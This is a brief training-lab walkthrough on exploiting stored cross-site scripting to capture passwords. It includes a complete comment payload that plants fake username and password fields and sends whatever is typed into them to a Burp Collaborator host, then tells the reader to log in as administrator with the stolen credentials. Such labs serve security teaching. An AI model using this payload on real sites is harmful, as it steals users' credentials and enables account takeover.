# Lab: Exploiting cross-site scripting to capture passwords

Open Burp Collaborator and copy the subdomain url.

Post a comment with the payload:
```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://<subdomain>.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```


Poll the collaborator and inspect the http request for credentials. Login as administrator to complete the lab.